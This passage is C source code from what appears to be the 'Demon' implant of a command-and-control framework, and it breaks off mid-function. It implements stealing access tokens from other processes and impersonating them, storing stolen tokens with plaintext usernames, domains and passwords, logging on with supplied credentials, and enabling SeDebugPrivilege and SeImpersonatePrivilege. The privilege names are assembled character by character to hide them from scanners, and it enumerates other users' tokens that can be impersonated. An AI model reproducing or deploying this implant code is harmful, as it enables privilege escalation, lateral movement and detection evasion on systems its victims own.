#include <Demon.h>

#include <Common/Macros.h>

#include <Core/Token.h>
#include <Core/Win32.h>
#include <Core/Package.h>
#include <Core/MiniStd.h>

#include <ntstatus.h>

/* TODO: Change the way new tokens gets added.
 *
 * Instead of appending it to the newest token like:
 * TokenNew->Next = Token
 *
 * Add it to the first token (parent):
 *
 * Token->Next            = Instance.Tokens.Vault;
 * Instance.Tokens.Vault = Token;
 *
 * Might reduce some code which i care more than
 * token order.
 * */

/*!
 * @brief
 *  Duplicate given token
 *
 * @param TokenOriginal
 * @param Access
 * @param ImpersonateLevel
 * @param TokenType
 * @param TokenNew
 * @return
 */
BOOL TokenDuplicate(
    IN  HANDLE        TokenOriginal,
    IN  DWORD         Access,
    IN  SEC_IMP_LEVEL ImpersonateLevel,
    IN  TOKEN_TYPE    TokenType,
    OUT PHANDLE       TokenNew
) {
    OBJECT_ATTRIBUTES   ObjAttr  = { 0 };
    SEC_QUALITY_SERVICE Sqos     = { 0 };
    NTSTATUS            NtStatus = STATUS_SUCCESS;

    Sqos.Length              = sizeof( SEC_QUALITY_SERVICE );
    Sqos.ImpersonationLevel  = ImpersonateLevel;
    Sqos.ContextTrackingMode = 0;
    Sqos.EffectiveOnly       = FALSE;

    /* Initialize Object Attributes */
    InitializeObjectAttributes( &ObjAttr, NULL, 0, NULL, NULL );

    ObjAttr.SecurityQualityOfService = &Sqos;

    /* duplicate token using native call */
    if ( ! NT_SUCCESS( NtStatus = SysNtDuplicateToken( TokenOriginal, Access, &ObjAttr, FALSE, TokenType, TokenNew ) ) ) {
        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        PRINTF( "NtDuplicateToken: Failed:[%08x : %ld]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        return FALSE;
    }

    return TRUE;
}

/*!
 * @brief
 *  reverse to the original process user token
 *
 * @return if successful reverse to original token
 */
BOOL TokenRevSelf(
    VOID
) {
    HANDLE   Token    = NULL;
    NTSTATUS NtStatus = STATUS_SUCCESS;

    if ( ! NT_SUCCESS( NtStatus = SysNtSetInformationThread( NtCurrentThread(), ThreadImpersonationToken, &Token, sizeof( HANDLE ) ) ) ) {
        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        return FALSE;
    }

    return TRUE;
}



/*!
 * @brief
 *  queries the username and or domain
 *
 * @note
 *  the queried memory should be freed after used
 *  using HeapFree/RtlFreeHeap
 *
 * @param Token
 * @param UserDomain
 * @param Flags
 * @return
 */
BOOL TokenQueryOwner(
    IN  HANDLE  Token,
    OUT PBUFFER UserDomain,
    IN  DWORD   Flags
) {
    NTSTATUS     NtStatus = STATUS_SUCCESS;
    BOOL         Success  = FALSE;
    PTOKEN_USER  UserInfo = NULL;
    ULONG        UserSize = 0;
    PVOID        Domain   = NULL;
    PVOID        User     = NULL;
    DWORD        UserLen  = { 0 };
    DWORD        DomnLen  = { 0 };
    SID_NAME_USE SidType  = 0;

    /* check if we specified the required args */
    if ( ! Token || ! UserDomain ) {
        return FALSE;
    }

    /* get the size for the TOKEN_USER struct */
    if ( ! NT_SUCCESS( NtStatus = SysNtQueryInformationToken( Token, TokenUser, UserInfo, 0, &UserSize ) ) )
    {
        UserInfo = NtHeapAlloc( UserSize );

        /* query the token user (we need the sid) */
        if ( ! NT_SUCCESS( NtStatus = SysNtQueryInformationToken( Token, TokenUser, UserInfo, UserSize, &UserSize ) ) ) {
            goto LEAVE;
        }

        /* now get the Username and Domain from the Sid */
        if ( ! Instance.Win32.LookupAccountSidW( NULL, UserInfo->User.Sid, NULL, &UserLen, NULL, &DomnLen, &SidType ) )
        {
            SidType = 0;

            if ( Flags == TOKEN_OWNER_FLAG_USER ) {
                UserDomain->Length = ( UserLen * sizeof( WCHAR ) );
            } else if ( Flags == TOKEN_OWNER_FLAG_DOMAIN ) {
                UserDomain->Length = ( DomnLen * sizeof( WCHAR ) );
            } else {
                UserDomain->Length = ( UserLen * sizeof( WCHAR ) ) + ( DomnLen * sizeof( WCHAR ) );
            }

            /* we allocate one buffer for specified owner flag */
            UserDomain->Buffer = NtHeapAlloc( UserDomain->Length );

            Domain = UserDomain->Buffer;
            User   = ( UserDomain->Buffer + ( DomnLen * sizeof( WCHAR ) ) );

            /* setup arguments */
            if ( Flags == TOKEN_OWNER_FLAG_USER ) {
                Domain = NtHeapAlloc( DomnLen * sizeof( WCHAR ) );
                User   = UserDomain->Buffer;
            } else if ( Flags == TOKEN_OWNER_FLAG_DOMAIN ) {
                User   = NtHeapAlloc( UserLen * sizeof( WCHAR ) );
            }

            /* now lets try to get the owner */
            if ( ! Instance.Win32.LookupAccountSidW( NULL, UserInfo->User.Sid, User, &UserLen, Domain, &DomnLen, &SidType ) ) {
                PRINTF( "LookupAccountSidW Error => %d\n", NtGetLastError() );
                goto LEAVE;
            }

            /* now let's add the \ between the Username and Domain */
            if ( Flags == TOKEN_OWNER_FLAG_DEFAULT ) {
                B_PTR( UserDomain->Buffer )[ ( DomnLen * sizeof( WCHAR ) ) ] = '\\';
            }

            /* if we reached til this point means we were pretty much successful */
            Success = TRUE;
        } else {
            PUTS( "Unexpected successful call to LookupAccountSidW.\n" )
        }
    } else {
        PUTS( "Unexpected successful call to NtQueryInformationToken.\n" )
    }

LEAVE:
    if ( UserInfo ) {
        DATA_FREE( UserInfo, UserSize )
    }

    if ( Flags == TOKEN_OWNER_FLAG_USER ) {
        DATA_FREE( Domain, DomnLen );
    } else if ( Flags == TOKEN_OWNER_FLAG_DOMAIN ) {
        DATA_FREE( User, UserLen );
    }

    return Success;
}

/*!
 * sets a privilege
 *
 * TODO: change it to use wide strings.
 *
 * @param Privilege
 * @param Enable
 * @return
 */
BOOL TokenSetPrivilege(
    IN LPSTR Privilege,
    IN BOOL  Enable
) {
    TOKEN_PRIVILEGES TokenPrivileges = { 0 };
    LUID             TokenLUID       = { 0 };
    NTSTATUS         NtStatus        = STATUS_SUCCESS;
    HANDLE           hToken          = NULL;

    if ( ! Instance.Win32.LookupPrivilegeValueA( NULL, Privilege, &TokenLUID ) ) {
        PRINTF( "[-] LookupPrivilegeValue error: %u\n", NtGetLastError() );
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount       = 1;
    TokenPrivileges.Privileges[ 0 ].Luid = TokenLUID;

    if ( Enable ) {
        TokenPrivileges.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
    } else {
        TokenPrivileges.Privileges[ 0 ].Attributes = 0;
    }

    if ( NT_SUCCESS( NtStatus = SysNtOpenProcessToken( NtCurrentProcess( ), TOKEN_ALL_ACCESS, &hToken ) ) ) {
        if ( ! Instance.Win32.AdjustTokenPrivileges( hToken, FALSE, &TokenPrivileges, 0, NULL, NULL ) ) {
            PRINTF( "[-] AdjustTokenPrivileges error: %u\n", NtGetLastError() );
            return FALSE;
        }
    } else {
        PRINTF( "NtOpenProcessToken: Failed [%d]", Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
        PACKAGE_ERROR_NTSTATUS( NtStatus )
        return FALSE;
    }

    return TRUE;
}

BOOL TokenSetSeDebugPriv(
    IN BOOL  Enable
) {
    CHAR PrivName[ 17 ] = { 0 };
    BOOL Success        = FALSE;

    // SeDebugPrivilege
    PrivName[ 2  ] = HideChar('D');
    PrivName[ 9  ] = HideChar('i');
    PrivName[ 16 ] = HideChar('\0');
    PrivName[ 0  ] = HideChar('S');
    PrivName[ 3  ] = HideChar('e');
    PrivName[ 6  ] = HideChar('g');
    PrivName[ 7  ] = HideChar('P');
    PrivName[ 11 ] = HideChar('i');
    PrivName[ 4  ] = HideChar('b');
    PrivName[ 5  ] = HideChar('u');
    PrivName[ 10 ] = HideChar('v');
    PrivName[ 15 ] = HideChar('e');
    PrivName[ 1  ] = HideChar('e');
    PrivName[ 13 ] = HideChar('e');
    PrivName[ 14 ] = HideChar('g');
    PrivName[ 12 ] = HideChar('l');
    PrivName[ 8  ] = HideChar('r');

    Success = TokenSetPrivilege(PrivName, Enable);
    MemZero( PrivName, sizeof( PrivName ) );

    return Success;
}

BOOL TokenSetSeImpersonatePriv(
    IN BOOL  Enable
) {
    CHAR PrivName[ 23 ] = { 0 };
    BOOL Success        = FALSE;

    // SeImpersonatePrivilege
    PrivName[ 7  ] = HideChar('s');
    PrivName[ 5  ] = HideChar('e');
    PrivName[ 4  ] = HideChar('p');
    PrivName[ 8  ] = HideChar('o');
    PrivName[ 3  ] = HideChar('m');
    PrivName[ 0  ] = HideChar('S');
    PrivName[ 11 ] = HideChar('t');
    PrivName[ 12 ] = HideChar('e');
    PrivName[ 17 ] = HideChar('i');
    PrivName[ 19 ] = HideChar('e');
    PrivName[ 22 ] = HideChar('\0');
    PrivName[ 6  ] = HideChar('r');
    PrivName[ 16 ] = HideChar('v');
    PrivName[ 21 ] = HideChar('e');
    PrivName[ 10 ] = HideChar('a');
    PrivName[ 15 ] = HideChar('i');
    PrivName[ 9  ] = HideChar('n');
    PrivName[ 1  ] = HideChar('e');
    PrivName[ 13 ] = HideChar('P');
    PrivName[ 14 ] = HideChar('r');
    PrivName[ 2  ] = HideChar('I');
    PrivName[ 18 ] = HideChar('l');
    PrivName[ 20 ] = HideChar('g');

    Success = TokenSetPrivilege(PrivName, Enable);
    MemZero( PrivName, sizeof( PrivName ) );

    return Success;
}

/*!
 * Adds an token to the vault.
 *
 * TODO:
 *  rewrite the function param. accept token object + STOLEN PID or MAKE data as a struct.
 *
 * @param hToken
 * @param DomainUser
 * @param Type
 * @param dwProcessID
 * @param User
 * @param Domain
 * @param Password
 * @return
 */
DWORD TokenAdd(
    IN HANDLE hToken,
    IN LPWSTR DomainUser,
    IN SHORT  Type,
    IN DWORD  dwProcessID,
    IN LPWSTR User,
    IN LPWSTR Domain,
    IN LPWSTR Password
) {
    PTOKEN_LIST_DATA TokenList   = NULL;
    PTOKEN_LIST_DATA TokenEntry  = NULL;
    DWORD            TokenIndex  = 0;

    TokenEntry              = Instance.Win32.LocalAlloc( LPTR, sizeof( TOKEN_LIST_DATA ) );
    TokenEntry->Handle      = hToken;
    TokenEntry->DomainUser  = DomainUser;
    TokenEntry->dwProcessID = dwProcessID;
    TokenEntry->Type        = Type;
    TokenEntry->lpUser      = User;
    TokenEntry->lpDomain    = Domain;
    TokenEntry->lpPassword  = Password;
    TokenEntry->NextToken   = NULL;

    if ( Instance.Tokens.Vault == NULL ) {
        Instance.Tokens.Vault = TokenEntry;
        return TokenIndex;
    }

    TokenList = Instance.Tokens.Vault;

    /* add TokenEntry to Token linked list */
    while ( TokenList->NextToken != NULL ) {
        TokenList = TokenList->NextToken;
        TokenIndex++;
    }

    TokenList->NextToken = TokenEntry;
    TokenIndex++;

    return TokenIndex;
}

BOOL SysDuplicateTokenEx(
    IN HANDLE ExistingTokenHandle,
    IN DWORD dwDesiredAccess,
    IN LPSECURITY_ATTRIBUTES lpTokenAttributes OPTIONAL,
    IN SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
    IN TOKEN_TYPE TokenType,
    OUT PHANDLE DuplicateTokenHandle)
{
    OBJECT_ATTRIBUTES           ObjAttr  = { 0 };
    NTSTATUS                    NtStatus = STATUS_UNSUCCESSFUL;
    SECURITY_QUALITY_OF_SERVICE Sqos     = { 0 };

    Sqos.Length              = sizeof( SECURITY_QUALITY_OF_SERVICE );
    Sqos.ImpersonationLevel  = ImpersonationLevel;
    Sqos.ContextTrackingMode = 0;
    Sqos.EffectiveOnly       = FALSE;

    if ( lpTokenAttributes ) {
        InitializeObjectAttributes( &ObjAttr, NULL, lpTokenAttributes->bInheritHandle ? OBJ_INHERIT : 0, NULL, lpTokenAttributes->lpSecurityDescriptor);
    }
    else {
        InitializeObjectAttributes( &ObjAttr, NULL, 0, NULL, NULL );
    }

    ObjAttr.SecurityQualityOfService = &Sqos;

    NtStatus = SysNtDuplicateToken(
        ExistingTokenHandle,
        dwDesiredAccess,
        &ObjAttr,
        FALSE,
        TokenType,
        DuplicateTokenHandle);
    if ( ! NT_SUCCESS( NtStatus ) )
    {
        PRINTF( "NtDuplicateToken: Failed:[%08x : %ld]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
        return FALSE;
    }

    return TRUE;
}

/*!
 * Steals the process token from the specified pid
 * @param ProcessID
 * @param TargetHandle
 * @return
 */
HANDLE TokenSteal(
    IN DWORD  ProcessID,
    IN HANDLE TargetHandle
) {
    HANDLE                      hProcess  = NULL;
    HANDLE                      hTokenDup = NULL;
    NTSTATUS                    NtStatus  = STATUS_SUCCESS;
    CLIENT_ID                   ProcID    = { 0 };
    OBJECT_ATTRIBUTES           TokenAttr = { 0 };
    SECURITY_QUALITY_OF_SERVICE Qos       = { 0 };

    hProcess = ProcessOpen( ProcessID, PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE );
    if ( hProcess )
    {
        if ( TargetHandle )
        {
            PRINTF( "Stealing handle 0x%x from PID %d\n", TargetHandle, ProcessID );

            NtStatus =  SysNtDuplicateObject( hProcess, TargetHandle, NtCurrentProcess(), &hTokenDup, 0, 0, DUPLICATE_SAME_ACCESS );
            if ( NT_SUCCESS( NtStatus ) )
            {
                SysNtClose( hProcess );
                return hTokenDup;
            }
            else
            {
                PRINTF( "NtDuplicateObject: Failed:[%08x : %ld]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
                PACKAGE_ERROR_NTSTATUS( NtStatus )
            }
        }
        else
        {
            PRINTF( "Stealing process handle from PID %d\n", ProcessID );

            NtStatus = SysNtOpenProcessToken( hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hTokenDup );
            if ( NT_SUCCESS( NtStatus ) )
            {
                SysNtClose( hProcess );
                return hTokenDup;
            }
            else
            {
                PRINTF( "NtOpenProcessToken: Failed:[%08x : %ld]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) )
                PACKAGE_ERROR_NTSTATUS( NtStatus )
            }
        }
    }
    else
    {
        PRINTF( "ProcessOpen: Failed:[%ld]\n", NtGetLastError() )
        PACKAGE_ERROR_WIN32
    }

    if ( hProcess ) {
        SysNtClose( hProcess );
    }

    return NULL;
}

BOOL TokenRemove( DWORD TokenID )
{
    PRINTF( "Token Remove => %d\n", TokenID )

    PTOKEN_LIST_DATA TokenList  = NULL;
    PTOKEN_LIST_DATA TokenItem  = NULL;

    TokenItem = TokenGet( TokenID );
    TokenList = Instance.Tokens.Vault;

    if ( ( ! TokenList ) || ( ! TokenItem ) )
        return FALSE;

    if ( Instance.Tokens.Vault == TokenItem )
    {
        PUTS( "Its first item" )
        TokenItem = Instance.Tokens.Vault->NextToken;

        if ( Instance.Tokens.Impersonate && Instance.Tokens.Token->Handle == Instance.Tokens.Vault->Handle )
            TokenImpersonate( FALSE );

        if ( Instance.Tokens.Vault->Handle )
        {
            SysNtClose( Instance.Tokens.Vault->Handle );
            Instance.Tokens.Vault->Handle = NULL;
        }

        if ( Instance.Tokens.Vault->DomainUser )
        {
            MemSet( Instance.Tokens.Vault->DomainUser, 0, StringLengthW( Instance.Tokens.Vault->DomainUser ) * sizeof( WCHAR ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault->DomainUser );
            Instance.Tokens.Vault->DomainUser = NULL;
        }

        if ( Instance.Tokens.Vault->lpUser )
        {
            MemSet( Instance.Tokens.Vault->lpUser, 0, StringLengthW( Instance.Tokens.Vault->lpUser ) * sizeof( WCHAR ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault->lpUser );
            Instance.Tokens.Vault->lpUser = NULL;
        }

        if ( Instance.Tokens.Vault->lpDomain )
        {
            MemSet( Instance.Tokens.Vault->lpDomain, 0, StringLengthW( Instance.Tokens.Vault->lpUser ) * sizeof( WCHAR ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault->lpDomain );
            Instance.Tokens.Vault->lpDomain = NULL;
        }

        if ( Instance.Tokens.Vault->lpPassword )
        {
            MemSet( Instance.Tokens.Vault->lpPassword, 0, StringLengthW( Instance.Tokens.Vault->lpPassword ) * sizeof( WCHAR ) );
            Instance.Win32.LocalFree( Instance.Tokens.Vault->lpPassword );
            Instance.Tokens.Vault->lpPassword = NULL;
        }

        MemSet( Instance.Tokens.Vault, 0, sizeof( TOKEN_LIST_DATA ) );
        Instance.Win32.LocalFree( Instance.Tokens.Vault );

        Instance.Tokens.Vault = TokenItem;

        return TRUE;
    }

    do
    {
        if ( TokenList )
        {
            if ( TokenList->NextToken == TokenItem )
            {
                PUTS( "Found TokenItem" )

                TokenList->NextToken = TokenItem->NextToken;

                if ( Instance.Tokens.Impersonate && Instance.Tokens.Token->Handle == TokenItem->Handle )
                    TokenImpersonate( FALSE );

                if ( TokenItem->Handle )
                {
                    SysNtClose( TokenItem->Handle );
                    TokenItem->Handle = NULL;
                }

                if ( TokenItem->DomainUser )
                {
                    MemSet( TokenItem->DomainUser, 0, StringLengthW( TokenItem->DomainUser ) * sizeof( WCHAR ) );
                    Instance.Win32.LocalFree( TokenItem->DomainUser );
                    TokenItem->DomainUser = NULL;
                }

                if ( TokenItem->lpUser )
                {
                    MemSet( TokenItem->lpUser, 0, StringLengthW( TokenItem->lpUser ) * sizeof( WCHAR ) );
                    Instance.Win32.LocalFree( TokenItem->lpUser );
                    TokenItem->lpUser = NULL;
                }

                if ( TokenItem->lpDomain )
                {
                    MemSet( TokenItem->lpDomain, 0, StringLengthW( TokenItem->lpUser ) * sizeof( WCHAR ) );
                    Instance.Win32.LocalFree( TokenItem->lpDomain );
                    TokenItem->lpDomain = NULL;
                }

                if ( TokenItem->lpPassword )
                {
                    MemSet( TokenItem->lpPassword, 0, StringLengthW( TokenItem->lpPassword ) * sizeof( WCHAR ) );
                    Instance.Win32.LocalFree( TokenItem->lpPassword );
                    TokenItem->lpPassword = NULL;
                }

                MemSet( TokenItem, 0, sizeof( TOKEN_LIST_DATA ) );
                Instance.Win32.LocalFree( TokenItem );
                TokenItem = NULL;

                return TRUE;
            }
            else
                TokenList = TokenList->NextToken;
        }
        else
            return FALSE;
    } while ( TRUE );
}

HANDLE TokenMake( LPWSTR User, LPWSTR Password, LPWSTR Domain )
{
    HANDLE hToken = NULL;

    PRINTF( "TokenMake( %ls, %ls, %ls )\n", User, Password, Domain )

    if ( ! TokenRevSelf() )
    {
        PRINTF( "Failed to revert to self: Error:[%d]\n", NtGetLastError() )
        PACKAGE_ERROR_WIN32
        // TODO: at this point should I return NULL or just continue ? For now i just continue.
    }

    if ( ! Instance.Win32.LogonUserW( User, Domain, Password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken ) )
    {
        PUTS( "LogonUserW: Failed" )
        PACKAGE_ERROR_WIN32
    }

    return hToken;
}

/*!
 * get current process/thread token
 * @return
 */
HANDLE TokenCurrentHandle(
    VOID
) {
    HANDLE   Token    = NULL;
    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;

    if ( ! NT_SUCCESS( NtStatus = SysNtOpenThreadToken( NtCurrentThread(), TOKEN_QUERY, TRUE, &Token ) ) )
    {
        if ( NtStatus != STATUS_NO_TOKEN )
        {
            PRINTF( "NtOpenThreadToken: Failed:[%08x : %ld]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            return NULL;
        }

        if ( ! NT_SUCCESS( NtStatus = SysNtOpenProcessToken( NtCurrentProcess(), TOKEN_QUERY, &Token ) ) )
        {
            PRINTF( "NtOpenProcessToken: Failed:[%08x : %ld]\n", NtStatus, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            return NULL;
        }
    }

    return Token;
}

BOOL TokenElevated(
    IN HANDLE Token
) {
    TOKEN_ELEVATION Data  = { 0 };
    DWORD           Size  = sizeof( TOKEN_ELEVATION );
    BOOL            Admin = FALSE;

    if ( NT_SUCCESS( SysNtQueryInformationToken( Token, TokenElevation, &Data, Size, &Size ) ) ) {
        Admin = U_PTR( Data.TokenIsElevated );
    }

    return Admin;
}

PTOKEN_LIST_DATA TokenGet(
    IN DWORD TokenID
) {
    PTOKEN_LIST_DATA TokenList  = Instance.Tokens.Vault;
    DWORD            TokenIndex = 0;

    for ( TokenIndex = 0; TokenIndex < TokenID && TokenList && TokenList->NextToken; ++TokenIndex ) {
        TokenList = TokenList->NextToken;
    }

    if ( TokenIndex != TokenID ) {
        return NULL;
    }

    return TokenList;
}

VOID TokenClear(
    VOID
) {
    PTOKEN_LIST_DATA TokenList  = Instance.Tokens.Vault;
    DWORD            TokenIndex = 0;

    TokenImpersonate( FALSE );

    do {
        if ( TokenList != NULL ) {
            TokenList = TokenList->NextToken;
        } else {
            break;
        }
        TokenIndex++;
    } while ( TRUE );

    for ( int i = 0; i < TokenIndex; i++ ) {
        TokenRemove( 0 );
    }

    Instance.Tokens.Impersonate = FALSE;
    Instance.Tokens.Vault       = NULL;
    Instance.Tokens.Token       = NULL;
}

BOOL TokenImpersonate(
    IN BOOL Impersonate
) {
    if ( Impersonate && ! Instance.Tokens.Impersonate && Instance.Tokens.Token )
    {
        // impersonate the current token.
        Instance.Tokens.Impersonate =  SysImpersonateLoggedOnUser( Instance.Tokens.Token->Handle );
        return Instance.Tokens.Impersonate;
    }
    else if ( ! Impersonate && Instance.Tokens.Impersonate ) {
    {
        // stop impersonating
        Instance.Tokens.Impersonate = FALSE;
        return TokenRevSelf();
    }
    } else if ( Impersonate && ! Instance.Tokens.Token ) {
        return TRUE; // there is no token to impersonate in the first place
    } else if ( Impersonate && Instance.Tokens.Impersonate ) {
        return TRUE; // we are already impersonating
    } else if ( ! Impersonate && ! Instance.Tokens.Impersonate ) {
        return TRUE; // we are already not impersonating
    }

    return FALSE;
}

VOID AddUserToken(
    IN OUT PUSER_TOKEN_DATA NewToken,
    IN OUT PUSER_TOKEN_DATA Tokens,
    IN OUT PDWORD           NumTokens
) {
    for ( DWORD i = 0; i < *NumTokens; ++i )
    {
        /* we consider two tokens the equal if they have the same:
         * - username
         * - type
         * - integrity
         * - impersonation level
         * also, we do not include tokens with the same user as our own
         * and try to include a primary token if we can
         */
        if ( ! StringCompareW( Tokens[i].username, NewToken->username) &&
               Tokens[i].TokenType == NewToken->TokenType &&
               Tokens[i].integrity_level == NewToken->integrity_level &&
               Tokens[i].impersonation_level == NewToken->impersonation_level &&
               ( ( Tokens[i].localHandle == 0 && NewToken->localHandle == 0 ) ||
                 ( Tokens[i].localHandle != 0 && NewToken->localHandle != 0 ) ) )
        {
            // a token similar to this one already exists
            return;
        }
    }

    // TODO: while unlikely, this could overflow
    StringCopyW( Tokens[ *NumTokens ].username, NewToken->username );
    Tokens[ *NumTokens ].dwProcessID = NewToken->dwProcessID;
    Tokens[ *NumTokens ].localHandle = NewToken->localHandle;
    Tokens[ *NumTokens ].impersonation_level = NewToken->impersonation_level;
    Tokens[ *NumTokens ].TokenType = NewToken->TokenType;
    Tokens[ *NumTokens ].integrity_level = NewToken->integrity_level;

    (*NumTokens)++;
}

BOOL IsImpersonationToken( HANDLE token )
{
    HANDLE temp_token              = NULL;
    BOOL   ReturnValue             = FALSE;
    LPVOID TokenImpersonationInfo  = NULL;
    DWORD  returned_tokinfo_length = 0;

    TokenImpersonationInfo = Instance.Win32.LocalAlloc( LPTR, BUF_SIZE );
    if ( ! TokenImpersonationInfo )
        return FALSE;

    if ( Instance.Win32.GetTokenInformation( token, TokenImpersonationLevel, TokenImpersonationInfo, BUF_SIZE, &returned_tokinfo_length ) )
    {
        if ( *( ( SECURITY_IMPERSONATION_LEVEL* ) TokenImpersonationInfo ) >= SecurityImpersonation )
            ReturnValue = TRUE;
        else
            ReturnValue = FALSE;
    }
    else
    {
        ReturnValue = TokenDuplicate( token, TOKEN_ALL_ACCESS, SecurityImpersonation, TokenImpersonation, &temp_token );
        SysNtClose( temp_token );
    }

    if ( TokenImpersonationInfo )
        Instance.Win32.LocalFree( TokenImpersonationInfo );

    return ReturnValue;
}

// https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/incognito/list_tokens.c
BOOL CanTokenBeImpersonated( IN HANDLE hToken )
{
    BOOL   Success = FALSE;
    HANDLE hImp    = NULL;

    // try to impersonate the token handle
    if ( ! SysImpersonateLoggedOnUser( hToken ) )
        return FALSE;

    // try to open a handle to the current token
    Success = Instance.Win32.OpenThreadToken( NtCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hImp );

    TokenRevSelf();

    if ( ! Success )
        return FALSE;

    // make sure the token kept the impersonate status
    Success = IsImpersonationToken( hImp );

    SysNtClose( hImp );

    if ( ! Success )
        return FALSE;

    return TRUE;
}

VOID ProcessUserToken(
    IN HANDLE hToken,
    IN DWORD ProcessId,
    IN HANDLE handle,
    IN BOOL CheckUsername,
    IN PBUFFER CurrentUser,
    IN OUT PUSER_TOKEN_DATA Tokens,
    IN OUT PDWORD           NumTokens)
{
    USER_TOKEN_DATA NewToken           = { 0 };
    DWORD           TokenType          = 0;
    DWORD           Integrity          = 0;
    DWORD           ImpersonationLevel = 0;
    BUFFER          UserDomain         = { 0 };

    // get the type, integrity and impersonation level for this token
    if ( GetTokenInfo( hToken, &TokenType, &Integrity, &ImpersonationLevel, &UserDomain ) )
    {
        // make sure the token can be impersonated
        if ( TokenType          == TokenPrimary          ||
             ImpersonationLevel == SecurityImpersonation ||
             ImpersonationLevel == SecurityDelegation)
        {
            // we avoid tokens from our own user as they are not relevant
            if ( IsNotCurrentUser( CheckUsername, CurrentUser, &UserDomain ) )
            {
                if ( CanTokenBeImpersonated( hToken ) )
                {
                    // create a new token structure and store it
                    StringCopyW( NewToken.username, UserDomain.Buffer );
                    NewToken.dwProcessID         = ProcessId;
                    NewToken.localHandle         = handle;
                    NewToken.integrity_level     = Integrity;
                    NewToken.impersonation_level = ImpersonationLevel;
                    NewToken.TokenType           = TokenType;

                    // save the new token (if we don't already have one like it)
                    AddUserToken(&NewToken, Tokens, NumTokens );
                }

            }
        }

        DATA_FREE( UserDomain.Buffer, UserDomain.Length );
    }
}

// call NtQueryObject with ObjectTypesInformation
BOOL QueryObjectTypesInfo( POBJECT_TYPES_INFORMATION* pObjectTypes, PULONG pObjectTypesSize )
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    ULONG BufferLength = 0x1000;
    ULONG PrevBufferLength = BufferLength;
    POBJECT_TYPES_INFORMATION ObjTypeInformation = NULL;

    do
    {
        PrevBufferLength   = BufferLength;
        ObjTypeInformation = Instance.Win32.LocalAlloc( LPTR, BufferLength );

        status = SysNtQueryObject(
            NULL,
            ObjectTypesInformation,
            ObjTypeInformation,
            BufferLength,
            &BufferLength);
        if ( NT_SUCCESS( status ) )
        {
            *pObjectTypes = ObjTypeInformation;
            *pObjectTypesSize = BufferLength;
            return TRUE;
        }

        DATA_FREE( ObjTypeInformation, PrevBufferLength );
    } while (status == STATUS_INFO_LENGTH_MISMATCH);

    return FALSE;
}

// get index of object type 'Token'
BOOL GetTypeIndexToken( OUT PULONG TokenTypeIndex )
{
    BOOL ret_val = FALSE;
    BOOL success = FALSE;
    POBJECT_TYPES_INFORMATION ObjectTypes = NULL;
    POBJECT_TYPE_INFORMATION_V2 CurrentType = NULL;
    ULONG ObjectTypesSize = 0;

    success = QueryObjectTypesInfo(
        &ObjectTypes,
        &ObjectTypesSize);
    if (!success)
        goto cleanup;

    CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_FIRST_ENTRY( ObjectTypes );
    for (ULONG i = 0; i < ObjectTypes->NumberOfTypes && CurrentType; i++)
    {
        if ( CurrentType->TypeName.Buffer            &&
             CurrentType->TypeName.Length    == 10   &&
             CurrentType->TypeName.Buffer[0] == L'T' &&
             CurrentType->TypeName.Buffer[1] == L'o' &&
             CurrentType->TypeName.Buffer[2] == L'k' &&
             CurrentType->TypeName.Buffer[3] == L'e' &&
             CurrentType->TypeName.Buffer[4] == L'n' )
        {
            *TokenTypeIndex = i + 2;
            ret_val = TRUE;
            break;
        }

        CurrentType = (POBJECT_TYPE_INFORMATION_V2)OBJECT_TYPES_NEXT_ENTRY( CurrentType );
    }

cleanup:
    DATA_FREE( ObjectTypes, ObjectTypesSize );

    return ret_val;
}

BOOL GetTokenInfo(
    IN HANDLE hToken,
    OUT PDWORD pTokenType,
    OUT PDWORD pIntegrity,
    OUT PDWORD pImpersonationLevel,
    OUT PBUFFER UserDomain)
{
    BOOL                          ReturnValue                   = FALSE;
    DWORD                         returned_tokinfo_length       = 0;
    DWORD                         cbSize                        = 0;
    DWORD                         returned_tokimp_length        = 0;
    PTOKEN_STATISTICS             TokenStatisticsInformation    = NULL;
    PTOKEN_MANDATORY_LABEL        TokenIntegrityInformation     = NULL;
    PSECURITY_IMPERSONATION_LEVEL TokenImpersonationInformation = NULL;

    if ( ! TokenQueryOwner( hToken, UserDomain, TOKEN_OWNER_FLAG_DEFAULT ) )
    {
        PUTS("TokenQueryOwner failed")
        goto Cleanup;
    }

    Instance.Win32.GetTokenInformation( hToken, TokenStatistics, NULL, 0, &returned_tokinfo_length );
    TokenStatisticsInformation = Instance.Win32.LocalAlloc( LPTR, returned_tokinfo_length );

    if ( Instance.Win32.GetTokenInformation( hToken, TokenStatistics, TokenStatisticsInformation, returned_tokinfo_length, &returned_tokinfo_length ) )
    {
        // save the token type
        *pTokenType = TokenStatisticsInformation->TokenType;

        if ( TokenStatisticsInformation->TokenType == TokenPrimary )
        {
            // get the token integrity level
            Instance.Win32.GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbSize );
